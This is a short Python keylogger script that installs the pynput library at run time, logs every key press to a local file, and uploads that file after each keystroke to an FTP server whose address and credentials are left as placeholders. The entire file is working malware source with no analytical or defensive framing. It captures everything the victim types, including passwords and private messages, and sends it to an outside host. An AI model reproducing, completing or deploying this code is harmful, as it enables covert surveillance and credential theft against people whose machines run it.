import ftplib,os
os.system("pip install pynput")
from pynput.keyboard import Listener
def evnt_key_press(key):
    f = open('key.txt','a')
    f.write(str(key).replace("'",''))
    f.close()
    session = ftplib.FTP('#FTP_SERVER_ADDRESS','#USERNAME','#PASSWORD')
    f = open('key.txt','rb')                 
    session.storbinary('STOR key.txt', f)     
    f.close()                                    
    session.quit()
obj = Listener(on_press=evnt_key_press)
obj.start()
obj.join()

